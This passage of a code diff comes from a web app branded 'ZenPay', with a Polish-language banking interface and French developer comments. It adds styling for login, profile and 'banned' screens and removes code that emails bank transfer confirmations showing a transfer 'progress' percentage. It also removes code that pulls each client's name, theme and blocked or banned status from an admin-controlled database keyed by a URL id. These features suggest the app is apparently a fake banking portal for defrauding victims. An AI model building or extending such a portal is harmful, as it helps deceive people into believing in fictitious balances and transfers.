+      padding: 8px 8px 12px; z-index: 100;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.08), 0 2px 8px rgba(0,0,0,0.04);
+      flex-shrink: 0; height: auto;
+      border-radius: 24px;
+    }
+    .nav-item {
+      color: #4B5563; font-size: 11px; font-weight: 700;
+      text-align: center; cursor: pointer; padding: 6px 0;
+      display: flex; flex-direction: column; align-items: center; gap: 4px;
+      letter-spacing: 0.2px;
+      transition: all 0.2s ease;
+      border-radius: 16px;
+    }
+    .nav-item:hover { color: var(--p); background: rgba(13,148,136,0.05); }
+    .nav-item i { font-size: 22px; color: #4B5563; transition: all 0.2s ease; }
+    .nav-item.active { color: var(--p); background: rgba(13,148,136,0.08); }
+    .nav-item.active i { color: var(--p); }
+
+    /* ===== LOGIN ===== */
+    .login-wrapper {
+      min-height: 100%; display: flex; align-items: center; justify-content: center;
+      padding: 40px 20px; flex: 1; background: #f0f2f5;
+    }
+    .login-card {
+      background: #ffffff; border-radius: var(--radius);
+      padding: 40px 30px; width: 100%; max-width: 400px;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.05), 0 4px 12px rgba(0,0,0,0.02);
+      border: 1px solid rgba(0,0,0,0.03);
+    }
+    .login-logo {
+      width: 56px; height: 56px; border-radius: 50%;
+      background: var(--p-gradient); display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 14px; font-size: 24px; font-weight: 700; color: #fff;
+      box-shadow: 0 8px 24px rgba(13,148,136,0.25);
+    }
+    .login-title { text-align: center; font-size: 26px; font-weight: 700; margin-bottom: 4px; letter-spacing: -0.3px; color: var(--text-primary); }
+    .login-sub { text-align: center; font-size: 15px; color: var(--text-secondary); margin-bottom: 24px; font-weight: 400; }
+    .login-info {
+      background: #f8fafc; padding: 12px 16px; border-radius: var(--radius-sm);
+      text-align: center; font-size: 14px; color: var(--text-secondary);
+      margin-bottom: 20px; border: 1px solid #eef2f6; font-weight: 400;
+    }
+    .login-error { color: #EF4444; margin-top: 8px; font-size: 12px; text-align: center; font-weight: 500; }
+    .login-card .input-group { margin-bottom: 18px; }
+    .login-card .input-group label {
+      display: block; font-size: 13px; font-weight: 500; color: var(--text-secondary);
+      margin-bottom: 4px; letter-spacing: 0.3px;
+    }
+    .login-card .input {
+      background: #fafbfc; border: 1.5px solid #e5e9ef; border-radius: var(--radius-sm);
+      font-size: 14px; padding: 12px 16px; transition: border-color 0.2s, box-shadow 0.2s;
+      width: 100%; color: var(--text-primary);
+    }
+    .login-card .input:focus {
+      outline: none; border-color: var(--p); box-shadow: 0 0 0 4px rgba(13,148,136,0.08);
+      background: #ffffff;
+    }
+    .login-card .input::placeholder { color: #b0b8c4; font-weight: 400; }
+    .login-card .btn {
+      margin-top: 8px; font-size: 15px; padding: 14px;
+      background: var(--p-gradient); box-shadow: 0 4px 12px rgba(13,148,136,0.3);
+      color: #fff; border: none; border-radius: var(--radius-sm);
+      font-weight: 600; cursor: pointer; transition: transform 0.1s, box-shadow 0.2s;
+    }
+    .login-card .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(13,148,136,0.35); }
+    .login-card .btn:active { transform: translateY(0); }
+
+    /* ===== TOAST ===== */
+    #t {
+      position: fixed; bottom: 72px; left: 50%; transform: translateX(-50%);
+      background: rgba(11,15,25,0.92); backdrop-filter: blur(4px); color: #fff;
+      padding: 8px 20px; border-radius: 50px; font-size: 12px; font-weight: 500;
+      z-index: 200; display: none; box-shadow: 0 16px 48px rgba(0,0,0,0.15);
+      border: 1px solid rgba(255,255,255,0.06); max-width: 90%; text-align: center;
+    }
+    #loading-overlay {
+      position: fixed; inset: 0; background: rgba(240,240,245,0.7); backdrop-filter: blur(2px);
+      display: flex; align-items: center; justify-content: center; z-index: 9999;
+      opacity: 0; pointer-events: none; transition: opacity 0.15s ease;
+    }
+    #loading-overlay.active { opacity: 1; pointer-events: all; }
+    .spinner-container { display: flex; flex-direction: column; align-items: center; gap: 14px; }
+    .spinner { width: 48px; height: 48px; border: 4px solid rgba(13,148,136,0.15); border-top-color: var(--p); border-radius: 50%; animation: spin 0.8s linear infinite; }
+    .spinner-text { font-size: 14px; font-weight: 500; color: var(--text-secondary); letter-spacing: 0.3px; }
+    #banner-container { margin-bottom: 16px; }
+    .banner-message {
+      display: flex; align-items: flex-start; justify-content: space-between;
+      background: #f0fdf4; border-radius: var(--radius-sm); padding: 12px 16px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.05); gap: 10px;
+    }
+    .banner-text { flex: 1; font-size: 14px; line-height: 1.5; color: #065f46; }
+    .banner-text strong { color: #047857; }
+    .banner-close {
+      flex-shrink: 0; background: transparent; border: none; font-size: 20px;
+      color: #9ca3af; cursor: pointer; padding: 0 4px; transition: color 0.2s; line-height: 1;
+    }
+    .banner-close:hover { color: #ef4444; }
+
+    /* ===== PROFIL ===== */
+    .profile-page { background: linear-gradient(180deg, #f8fafc 0%, #f0f2f5 100%); min-height: calc(100vh - 80px); }
+    .profile-page .profile-header-card {
+      background: var(--p-gradient); border-radius: var(--radius);
+      padding: 28px 20px 20px; margin-bottom: 16px; color: #fff;
+      text-align: center; position: relative; overflow: hidden;
+      box-shadow: 0 12px 32px rgba(13,148,136,0.25);
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+    .profile-page .profile-header-card::before {
+      content: ''; position: absolute; top: -50%; right: -30%; width: 180px; height: 180px;
+      background: rgba(255,255,255,0.06); border-radius: 50%;
+    }
+    .profile-page .profile-header-card::after {
+      content: ''; position: absolute; bottom: -40%; left: -20%; width: 140px; height: 140px;
+      background: rgba(255,255,255,0.04); border-radius: 50%;
+    }
+    .profile-page .profile-avatar-large {
+      width: 68px; height: 68px; border-radius: 50%;
+      background: rgba(255,255,255,0.2); border: 3px solid rgba(255,255,255,0.4);
+      display: flex; align-items: center; justify-content: center; margin: 0 auto 10px;
+      font-size: 28px; font-weight: 700; color: #fff; backdrop-filter: blur(4px);
+      position: relative; z-index: 2;
+    }
+    .profile-page .profile-name { font-size: 20px; font-weight: 700; margin-bottom: 2px; position: relative; z-index: 2; }
+    .profile-page .profile-email { font-size: 13px; opacity: 0.85; margin-bottom: 14px; position: relative; z-index: 2; }
+    .profile-page .profile-status-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: rgba(255,255,255,0.2); backdrop-filter: blur(4px);
+      padding: 4px 14px; border-radius: 50px; font-size: 12px; font-weight: 600;
+      border: 1px solid rgba(255,255,255,0.25); position: relative; z-index: 2;
+    }
+    .profile-page .profile-status-badge .dot {
+      width: 8px; height: 8px; border-radius: 50%; background: #10B981;
+      box-shadow: 0 0 8px rgba(16,185,129,0.6); animation: pulse-dot 2s ease-in-out infinite;
+    }
+    @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.7; transform: scale(0.85); } }
+    .profile-page .profile-section-pro {
+      background: #fff; border: 1px solid #e5e7eb; border-radius: var(--radius-sm);
+      padding: 0; margin-bottom: 14px; box-shadow: var(--shadow-soft); overflow: hidden;
+    }
+    .profile-page .profile-section-header-pro {
+      display: flex; align-items: center; gap: 8px; padding: 12px 16px;
+      background: linear-gradient(90deg, #f8fafc, #fff); border-bottom: 1px solid #f1f5f9;
+    }
+    .profile-page .profile-section-icon {
+      width: 32px; height: 32px; border-radius: 8px; background: var(--p-soft);
+      display: flex; align-items: center; justify-content: center; color: var(--p);
+      font-size: 14px; flex-shrink: 0;
+    }
+    .profile-page .profile-section-title-pro { font-size: 14px; font-weight: 700; color: var(--text-primary); letter-spacing: 0.2px; }
+    .profile-page .profile-section-subtitle { font-size: 11px; color: var(--text-secondary); font-weight: 400; }
+    .profile-page .profile-row-pro {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 12px 16px; border-bottom: 1px solid #f8fafc;
+      transition: background 0.15s;
+    }
+    .profile-page .profile-row-pro:hover { background: #fafbfc; }
+    .profile-page .profile-row-pro:last-child { border-bottom: none; }
+    .profile-page .profile-row-left { display: flex; align-items: center; gap: 10px; min-width: 0; flex: 1; }
+    .profile-page .profile-row-icon {
+      width: 28px; height: 28px; border-radius: 6px; background: #f1f5f9;
+      display: flex; align-items: center; justify-content: center; color: var(--text-secondary);
+      font-size: 12px; flex-shrink: 0;
+    }
+    .profile-page .profile-row-label { font-size: 11px; color: var(--text-secondary); font-weight: 500; margin-bottom: 2px; }
+    .profile-page .profile-row-value { font-size: 13px; font-weight: 600; color: var(--text-primary); word-break: break-word; }
+    .profile-page .profile-row-value-muted { font-size: 13px; font-weight: 500; color: var(--text-secondary); }
+    .profile-page .profile-row-action { flex-shrink: 0; margin-left: 6px; }
+    .profile-page .profile-row-action i { color: #cbd5e1; font-size: 13px; }
+    .profile-page .profile-balance-highlight {
+      background: linear-gradient(135deg, #ecfdf5, #d1fae5);
+      border: 1px solid #a7f3d0; border-radius: var(--radius-sm);
+      padding: 14px 16px; margin: 12px 16px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .profile-page .profile-balance-highlight .bal-label { font-size: 11px; color: #059669; font-weight: 500; margin-bottom: 2px; }
+    .profile-page .profile-balance-highlight .bal-value { font-size: 18px; font-weight: 700; color: #047857; }
+    .profile-page .profile-balance-highlight .bal-icon {
+      width: 38px; height: 38px; border-radius: var(--radius-sm); background: #fff;
+      display: flex; align-items: center; justify-content: center; color: #10B981;
+      font-size: 18px; box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    }
+    .profile-page .profile-logout-btn {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      width: 100%; padding: 12px; background: linear-gradient(135deg, #fef2f2, #fff);
+      border: 1.5px solid #fecaca; color: #dc2626; border-radius: var(--radius-sm);
+      font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+      margin-top: 6px;
+    }
+    .profile-page .profile-logout-btn:hover { background: #fef2f2; border-color: #f87171; box-shadow: 0 4px 12px rgba(220,38,38,0.1); }
+    .profile-page .profile-footer-note {
+      text-align: center; font-size: 11px; color: var(--text-muted); margin-top: 16px; padding: 0 16px; line-height: 1.5;
+    }
+    .profile-page .profile-footer-note i { color: var(--p); margin-right: 4px; }
+
+    /* ===== BANNED SCREEN ===== */
+    #banned-screen {
+      display: none; position: fixed; inset: 0; background: #fff; z-index: 99999;
+      align-items: center; justify-content: center; flex-direction: column;
+      overflow-y: auto; padding: 20px;
+    }
+    #banned-screen .banned-logo { display: flex; align-items: center; gap: 6px; margin-bottom: 6px; }
+    #banned-screen .banned-logo-icon {
+      width: 28px; height: 28px; border-radius: 50%;
+      background: linear-gradient(135deg, #14b8a6, #0d9488);
+      display: flex; align-items: center; justify-content: center; color: #fff;
+      font-size: 13px; font-weight: 700;
+    }
+    #banned-screen .banned-logo-text { font-size: 15px; font-weight: 700; color: #1a1a2e; }
+    #banned-screen .banned-sub { font-size: 20px; font-weight: 700; color: #6b7280; text-align: center; margin-bottom: 24px; letter-spacing: 0.5px; }
+    #banned-screen .banned-illustration { width: 100%; max-width: 380px; height: 220px; position: relative; margin-bottom: 24px; }
+    #banned-screen .banned-phone {
+      position: absolute; width: 80px; height: 140px; border-radius: 12px;
+      background: linear-gradient(180deg, #60a5fa, #3b82f6);
+      box-shadow: 0 8px 24px rgba(59,130,246,0.25); border: 3px solid #fff;
+    }
+    #banned-screen .banned-phone::before {
+      content: ''; position: absolute; top: 6px; left: 6px; right: 6px; height: 96px;
+      background: #fff; border-radius: 6px;
+    }
+    #banned-screen .banned-phone::after {
+      content: ''; position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%);
+      width: 20px; height: 3px; background: rgba(255,255,255,0.5); border-radius: 2px;
+    }
+    #banned-screen .banned-phone.left { left: 50px; top: 30px; transform: rotate(-6deg); }
+    #banned-screen .banned-phone.right { right: 50px; top: 20px; transform: rotate(6deg); }
+    #banned-screen .banned-phone .screen-content {
+      position: absolute; top: 16px; left: 10px; right: 10px; height: 80px;
+      z-index: 2; display: flex; align-items: center; justify-content: center;
+    }
+    #banned-screen .banned-wallet {
+      width: 38px; height: 28px; background: linear-gradient(135deg, #34d399, #10b981);
+      border-radius: 5px; position: relative; box-shadow: 0 2px 8px rgba(16,185,129,0.3);
+    }
+    #banned-screen .banned-wallet::before {
+      content: ''; position: absolute; top: 6px; right: 6px; width: 6px; height: 6px;
+      background: #fff; border-radius: 50%;
+    }
+    #banned-screen .banned-check {
+      width: 24px; height: 24px; background: #10b981; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; color: #fff;
+      font-size: 12px; box-shadow: 0 2px 8px rgba(16,185,129,0.3);
+    }
+    #banned-screen .banned-card-mini {
+      width: 34px; height: 20px; background: linear-gradient(135deg, #60a5fa, #3b82f6);
+      border-radius: 4px; position: relative;
+    }
+    #banned-screen .banned-card-mini::before {
+      content: ''; position: absolute; top: 3px; left: 3px; right: 3px; height: 5px;
+      background: rgba(255,255,255,0.3); border-radius: 2px;
+    }
+    #banned-screen .banned-card-mini::after {
+      content: ''; position: absolute; bottom: 3px; right: 3px; width: 8px; height: 5px;
+      background: rgba(255,255,255,0.4); border-radius: 1px;
+    }
+    #banned-screen .banned-arrow {
+      position: absolute; width: 34px; height: 2px;
+      background: linear-gradient(90deg, #34d399, #60a5fa);
+      top: 78px; left: 50%; transform: translateX(-50%);
+    }
+    #banned-screen .banned-arrow::before {
+      content: ''; position: absolute; right: -2px; top: -4px; width: 0; height: 0;
+      border-left: 8px solid #60a5fa; border-top: 5px solid transparent; border-bottom: 5px solid transparent;
+    }
+    #banned-screen .banned-person { position: absolute; width: 30px; height: 60px; }
+    #banned-screen .banned-person svg { width: 100%; height: 100%; }
+    #banned-screen .banned-person.left { left: 6px; bottom: 16px; }
+    #banned-screen .banned-person.right { right: 6px; bottom: 24px; }
+    #banned-screen .banned-plant {
+      position: absolute; width: 20px; height: 40px; bottom: 16px; left: 50%; transform: translateX(-50%);
+    }
+    #banned-screen .banned-btn {
+      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+      background: #d1d5db; border: 1px solid #9ca3af; border-radius: var(--radius-sm);
+      padding: 12px 24px; font-size: 14px; font-weight: 700; color: #374151;
+      cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.08); transition: all 0.2s;
+    }
+    #banned-screen .banned-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(0,0,0,0.1); }
+    #banned-screen .banned-btn i { color: #6b7280; }
+    #banned-screen .banned-bottom { text-align: center; margin-top: 24px; }
+
+    /* ===== AJUSTEMENTS RESPONSIVE ===== */
+    @media (max-width: 480px) {
+      main { padding: 12px 14px 100px; }
+      .balance-panel { padding: 20px 18px 16px; min-height: 160px; }
+      .balance-panel .amount { font-size: 28px; }
+      .balance-actions-wrapper .btn-action { font-size: 12px; padding: 10px 12px; min-height: 40px; border-radius: 12px; }
+      .btn-iban { font-size: 12px; padding: 10px 12px; min-height: 40px; border-radius: 12px; }
+      .quick-stats { gap: 8px; }
+      .stat-item .stat-value { font-size: 18px; }
+      .history-item { padding: 12px 12px; min-height: 52px; }
+      .history-info .title { font-size: 14px; }
+      .history-amount { font-size: 14px; }
+      .modal-content { padding: 16px 14px 12px; margin: 0 6px; max-height: 80vh; }
+      .login-card { padding: 30px 20px; }
+      .profile-page .profile-header-card { padding: 24px 16px 16px; }
+      .profile-page .profile-avatar-large { width: 56px; height: 56px; font-size: 24px; }
+      .profile-page .profile-name { font-size: 18px; }
+    }
+    @media (max-width: 360px) {
+      body { font-size: 14px; }
+      .balance-panel .amount { font-size: 18px; }
+      .balance-actions-wrapper .btn-action { font-size: 11px; padding: 6px 8px; min-height: 28px; }
+      .btn-iban { font-size: 11px; padding: 6px 8px; min-height: 28px; }
+      .stat-item .stat-value { font-size: 14px; }
+      .login-card { padding: 24px 16px; }
+      .nav-item { font-size: 9px; }
+      .nav-item i { font-size: 18px; }
+    }
+
+    /* ===== SUPPRESSION DES STYLES DE BORDURE COLORÉE ===== */
+    /* Les styles .input:invalid et .input:valid ont été retirés pour revenir à l'apparence d'origine */
+  </style>
+  <script>
+    (function() {
+      if (location.search.indexOf('id=') !== -1) {
+        window.__clientIdFromUrl = new URLSearchParams(location.search).get('id');
+      }
+    })();
+  </script>
 </head>
-<body style="margin:0; padding:0; background:#f3f4f6; font-family:'Segoe UI',Arial,sans-serif; -webkit-font-smoothing:antialiased;">
-<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f3f4f6; margin:0; padding:0;">
-  <tr>
-    <td align="center" style="padding:0; margin:0;">
-      <table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%; max-width:none; background:#ffffff; border-radius:0; overflow:hidden;">
-
-        <!-- HEADER -->
-        <tr>
-          <td style="background:linear-gradient(135deg, ${headerColor}, ${isRefund ? '#991B1B' : (success ? '#0F766E' : '#B45309')}); padding:28px 24px; text-align:center;">
-            <div style="font-size:36px; font-weight:900; color:#fff; letter-spacing:-0.5px;">ZenPay</div>
-            <div style="font-size:10px; color:rgba(255,255,255,0.75); margin-top:4px; text-transform:uppercase; letter-spacing:2px;">Bankowość internetowa</div>
-          </td>
-        </tr>
-
-        <!-- BADGE STATUT -->
-        <tr>
-          <td align="center" style="padding:28px 24px 8px;">
-            <div style="display:inline-block; background:${statutBg}; color:${statutColor}; border:1.5px solid ${statutColor}; border-radius:50px; padding:8px 24px; font-size:12px; font-weight:700; letter-spacing:1px; text-transform:uppercase;">
-              ${iconChar} ${statutLabel}
-            </div>
-          </td>
-        </tr>
-
-        <!-- MESSAGE -->
-        <tr>
-          <td style="padding:16px 24px 8px; text-align:left;">
-            <p style="margin:0; font-size:14px; color:#4b5563; line-height:1.5;">${messageText}</p>
-          </td>
-        </tr>
-
-        <!-- RÉCÉPISSE BANCAIRE -->
-        <tr>
-          <td style="padding:8px 24px 24px;">
-            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#fafbfc; border:1px solid #e5e7eb; border-radius:12px; overflow:hidden;">
-              <tr>
-                <td colspan="2" style="background:#f8fafc; padding:14px 20px; border-bottom:1px solid #e5e7eb;">
-                  <div style="font-size:10px; color:#9ca3af; text-transform:uppercase; letter-spacing:1.5px; font-weight:600;">Potwierdzenie przelewu</div>
-                  <div style="font-size:16px; font-weight:700; color:#1a1a2e; margin-top:2px;">#${ref}</div>
-                </td>
-              </tr>
-              <tr>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280; width:40%;">Data i godzina</td>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:13px; color:#1a1a2e; font-weight:600;">${dateStr} • ${timeStr}</td>
-              </tr>
-              <tr>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">Kwota</td>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:18px; color:${accentColor}; font-weight:800;">${montantFormatted}</td>
-              </tr>
-              <tr>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">${isRefund ? 'Nadawca' : 'Odbiorca'}</td>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:13px; color:#1a1a2e; font-weight:600;">${benef}</td>
-              </tr>
-              <tr>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">Konto (IBAN)</td>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:13px; color:#1a1a2e; font-weight:600; font-family:'Courier New',monospace; word-break:break-all;">${compteAffiche}</td>
-              </tr>
-              <tr>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">Status</td>
-                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6;">
-                  <span style="display:inline-block; background:${statutBg}; color:${statutColor}; border-radius:20px; padding:4px 14px; font-size:12px; font-weight:700;">${statutLabel}</span>
-                </td>
-              </tr>
-              ${!success && !isRefund ? `<tr>
-                <td style="padding:12px 20px; font-size:11px; color:#6b7280;">Postęp</td>
-                <td style="padding:12px 20px; font-size:13px; color:#1a1a2e; font-weight:700;">${pct || 0}%</td>
-              </tr>` : ''}
-            </table>
-          </td>
-        </tr>
-
-        <!-- SÉCURITÉ -->
-        <tr>
-          <td style="padding:0 24px 24px;">
-            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:10px;">
-              <tr>
-                <td style="padding:14px 18px;">
-                  <div style="font-size:12px; color:#15803d; font-weight:600; margin-bottom:4px;">🔒 Bezpieczeństwo transakcji</div>
-                  <div style="font-size:12px; color:#22c55e; line-height:1.5;">To potwierdzenie zostało wygenerowane automatycznie przez system ZenPay. Nie przekazuj tego e-maila osobom trzecim.</div>
-                </td>
-              </tr>
-            </table>
-          </td>
-        </tr>
-
-        <!-- FOOTER -->
-        <tr>
-          <td style="padding:20px 24px; border-top:1px solid #f3f4f6; text-align:center;">
-            <div style="font-size:11px; color:#9ca3af; line-height:1.6;">
-              ${footerTextPlain}<br>
-              <span style="font-size:11px; color:#d1d5db;">© 2026 ZenPay Finance. Wszelkie prawa zastrzeżone.</span>
-            </div>
-          </td>
-        </tr>
-
-      </table>
-    </td>
-  </tr>
-</table>
-</body>
-</html>`;
-
-    const textContent = `ZENPAY – POTWIERDZENIE PRZELEWU
-
-Status: ${statutLabel}
-${messageText}
-
-─────────────────────────────
-Numer rezerwacji: #${ref}
-Data: ${dateStr}
-Godzina: ${timeStr}
-Kwota: ${montantFormatted}
-${isRefund ? 'Nadawca' : 'Odbiorca'}: ${benef}
-Konto (IBAN): ${compteAffiche}
-${!success && !isRefund ? 'Postęp: ' + (pct || 0) + '%' : ''}
-─────────────────────────────
-
-${footerTextPlain}
-© 2026 ZenPay Finance.`;
-
-    const res = await fetch(API_URL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-api-key': API_KEY
-      },
-      body: JSON.stringify({
-        email: to,
-        prenom: name,
-        sujet: sujet,
-        html: htmlContent,
-        text: textContent
-      })
-    });
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.error || 'Erreur inconnue');
-    return data;
-  } catch (error) {
-    console.error('Erreur envoi mail:', error);
-    throw error;
-  }
-};
-
-// ===== OVERLAY SPINNER =====
-const overlay = document.getElementById('loading-overlay');
-let loadingTimeout = null;
-
-function showLoading(message = 'Ładowanie...') {
-  if (loadingTimeout) {
-    clearTimeout(loadingTimeout);
-    loadingTimeout = null;
-  }
-  const textEl = overlay.querySelector('.spinner-text');
-  if (textEl) textEl.textContent = message;
-  overlay.setAttribute('aria-busy', 'true');
-  overlay.classList.add('active');
-}
-
-function hideLoading() {
-  overlay.removeAttribute('aria-busy');
-  overlay.classList.remove('active');
-  if (loadingTimeout) {
-    clearTimeout(loadingTimeout);
-    loadingTimeout = null;
-  }
-  loadingTimeout = setTimeout(() => {
-    const textEl = overlay.querySelector('.spinner-text');
-    if (textEl) textEl.textContent = 'Ładowanie...';
-  }, 500);
-}
-
-window.withSpinner = function(action, duration = 350) {
-  let start = Date.now();
-  showLoading('Ładowanie...');
-  let result;
-  try {
-    result = action();
-  } catch (e) {
-    console.error(e);
-    hideLoading();
-    toast('Wystąpił błąd podczas akcji');
-    return;
-  }
-  if (result && typeof result.then === 'function') {
-    result
-      .then(() => {
-        const elapsed = Date.now() - start;
-        const remaining = Math.max(0, duration - elapsed);
-        setTimeout(hideLoading, remaining);
-      })
-      .catch((err) => {
-        console.error(err);
-        toast('Wystąpił błąd podczas akcji');
-        hideLoading();
-      });
-  } else {
-    const elapsed = Date.now() - start;
-    const remaining = Math.max(0, duration - elapsed);
-    setTimeout(hideLoading, remaining);
-  }
-};
-
-// ===== THEMES =====
-const themes = {
-  teal: { p: '#0D9488', l: '#CCFBF1' },
-  purple: { p: '#6A0DAD', l: '#F3E8FF' },
-  blue: { p: '#2563EB', l: '#DBEAFE' },
-  yellow: { p: '#EAB308', l: '#FEF3C7' },
-  rose: { p: '#E83B7A', l: '#FCE4EC' },
-  orange: { p: '#F97316', l: '#FED7AA' },
-  green: { p: '#22C55E', l: '#DCFCE7' }
-};
-
-function adjustBrightness(hex, percent) {
-  const num = parseInt(hex.replace('#', ''), 16);
-  const r = Math.min(255, Math.max(0, (num >> 16) + percent));
-  const g = Math.min(255, Math.max(0, ((num >> 8) & 0x00FF) + percent));
-  const b = Math.min(255, Math.max(0, (num & 0x0000FF) + percent));
-  return `#${(r << 16 | g << 8 | b).toString(16).padStart(6, '0')}`;
-}
-
-function applyTheme(theme) {
-  const t = themes[theme] || themes.teal;
-  document.documentElement.style.setProperty('--p', t.p);
-  document.documentElement.style.setProperty('--p-light', t.l);
-  document.documentElement.style.setProperty('--p-gradient', `linear-gradient(135deg, ${t.p}, ${adjustBrightness(t.p, -10)})`);
-  document.documentElement.style.setProperty('--p-soft', `${t.p}14`);
-  localStorage.setItem('zenpay_theme', theme);
-}
-
-const urlParams = new URLSearchParams(window.location.search);
-const urlTheme = urlParams.get('theme');
-const savedTheme = (urlTheme && themes[urlTheme]) ? urlTheme : (localStorage.getItem('zenpay_theme') || 'teal');
-applyTheme(savedTheme);
-
-// ===== SYNCHRONISATION TEMPS RÉEL DEPUIS L'ADMIN =====
-const bannedScreen = document.getElementById('banned-screen');
-const blockedMsg = document.getElementById('blocked-msg');
-
-function showBanned() {
-  document.querySelectorAll('.screen').forEach(s => {
-    s.classList.remove('active');
-    s.style.display = 'none';
-  });
-  if (bannedScreen) bannedScreen.style.display = 'flex';
-  if (window.__clientIdFromUrl) {
-    localStorage.removeItem('zenpay_client_cache_' + window.__clientIdFromUrl);
-  }
-}
-
-function showLogin() {
-  if (bannedScreen) bannedScreen.style.display = 'none';
-}
-
-function hideBlockedMsg() {
-  if (blockedMsg) blockedMsg.style.display = 'none';
-}
-
-function showBlockedMsg() {
-  if (blockedMsg) blockedMsg.style.display = 'block';
-}
-
-function updateClientDisplay(data) {
-  if (!data) {
-    showBanned();
-    return;
-  }
-  const nameEl = document.getElementById('client-name');
-  if (nameEl && data.nom) {
-    nameEl.textContent = data.nom;
-    nameEl.style.display = 'block';
-  }
-  if (data.theme && themes[data.theme]) {
-    applyTheme(data.theme);
-    localStorage.setItem('zenpay_theme', data.theme);
-  }
-  if (window.__clientIdFromUrl) {
-    const cacheKey = 'zenpay_client_cache_' + window.__clientIdFromUrl;
-    localStorage.setItem(cacheKey, JSON.stringify({
-      nom: data.nom || '',
-      theme: data.theme || 'teal',
-      timestamp: Date.now()
-    }));
-  }
-  if (data.blocked) {
-    showLogin();
-    showBlockedMsg();
-    return;
-  }
-  showLogin();
-  hideBlockedMsg();
-}
-
-if (window.__clientIdFromUrl) {
-  onValue(ref(db, 'clients/' + window.__clientIdFromUrl), (snap) => {
-    const data = snap.val();
-    if (!data) {
-      localStorage.removeItem('zenpay_session');
-      localStorage.removeItem('zenpay_session_id');
-      localStorage.removeItem('zenpay_client_id');
-      showBanned();
-      return;
-    }
-    updateClientDisplay(data);
-    if (data.blocked) {
-      showBlockedMsg();
-      if (localStorage.getItem('zenpay_session')) {
-        localStorage.removeItem('zenpay_session');
-        localStorage.removeItem('zenpay_session_id');
-        localStorage.removeItem('zenpay_client_id');
-        if (user) {
-          user = null;
-          if (historyListener) historyListener();
-          if (balanceListener) balanceListener();
-          if (statusListener) statusListener();
-          if (banqueRef) banqueRef();
-          clearBannerTimer();
-        }
-        show('login');
-      }
-    } else {
-      hideBlockedMsg();
-    }
-  });
-
-  if (!localStorage.getItem('zenpay_session')) {
-    showLoading('Weryfikacja konta...');
-    get(ref(db, 'clients/' + window.__clientIdFromUrl)).then((snap) => {
-      const data = snap.val();
-      hideLoading();
-
-      if (!data) {
-        showBanned();
-        return;
-      }
-
-      updateClientDisplay(data);
-
-      if (data.blocked) {
-        showBlockedMsg();
-        show('login');
-      } else {
-        hideBlockedMsg();
-        show('login');
-      }
-
-      const newUrl = new URL(window.location.href);
-      newUrl.searchParams.set('nom', encodeURIComponent(data.nom || ''));
-      newUrl.searchParams.set('theme', encodeURIComponent(data.theme || 'teal'));
-      window.history.replaceState({}, '', newUrl.toString());
-
-    }).catch(() => {
-      hideLoading();
-      show('login');
-    });
-  }
-} else if (!localStorage.getItem('zenpay_session')) {
-  show('login');
-}
-
-// ===== FORMAT DE MONNAIE =====
-function normalizeDevise(dev) {
-  if (!dev) return 'PLN';
-  var d = String(dev).trim().toUpperCase();
-  if (d === 'ZŁ' || d === 'PLN') return 'PLN';
-  if (d === 'EUR' || d === '€') return 'EUR';
-  if (d === 'USD' || d === '$' || d === '$') return 'USD';
-  if (d === 'ILS' || d === '₪') return 'ILS';
-  return d;
-}
-
-function getDeviseSymbol(code) {
-  if (code === 'PLN') return 'zł';
-  if (code === 'EUR') return '€';
-  if (code === 'USD') return '$';
-  if (code === 'ILS') return '₪';
-  return code;
-}
-
-function getDeviseLabel(code) {
-  if (code === 'PLN') return 'PLN (zł)';
-  if (code === 'EUR') return 'EUR (€)';
-  if (code === 'USD') return 'USD ($)';
-  if (code === 'ILS') return 'ILS (₪)';
-  return code;
-}
-
-const fmt = (n) => {
-  const devCode = normalizeDevise((user && user.devise) ? user.devise : 'zł');
-  const sym = getDeviseSymbol(devCode);
-  const num = Number(n) || 0;
-  const parts = num.toFixed(2).split('.');
-  let intPart = parts[0];
-  const reversed = intPart.split('').reverse().join('');
-  const groups = reversed.match(/.{1,3}/g);
-  const spaced = groups.join(' ').split('').reverse().join('');
-  return spaced + ',' + parts[1] + ' ' + sym;
-};
-
-function adjustFontSize(element, baseSize, maxChars, minSize) {
-  if (!element) return;
-  requestAnimationFrame(() => {
-    const text = element.textContent || '';
-    const container = element.parentElement;
-    if (!container) return;
-    const containerWidth = container.clientWidth - 10;
